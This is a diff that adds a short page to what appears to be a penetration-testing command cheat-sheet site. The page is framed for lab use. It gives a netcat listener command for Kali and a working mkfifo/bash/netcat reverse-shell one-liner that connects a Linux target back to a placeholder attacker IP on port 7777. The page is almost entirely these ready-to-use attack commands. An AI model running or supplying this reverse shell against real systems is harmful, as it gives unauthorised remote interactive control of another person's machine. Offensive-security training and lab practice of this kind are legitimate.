@@ -1,0 +1,38 @@
+---
+title: "Linux → Kali reverse shell"
+sidebarTitle: "Linux → Kali reverse shell"
+description: "Listen on Kali, then connect from the Linux target."
+keywords: ["linux reverse shell", "bash reverse shell"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/linux-reverse-shell.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Replace UPPER_CASE values with your lab values.
+
+## 1. Kali — listener
+
+**Kali**
+
+```bash
+nc -lvnp 7777
+```
+
+## 2. Linux target — connect
+
+**Linux target**
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 7777 > /tmp/f
+```
+
+Replace &lt;ATTACKER_IP>; the saved recipe uses /tmp/f.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=linux%20reverse%20shell)
+
+## Learning and original examples
+
+- [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
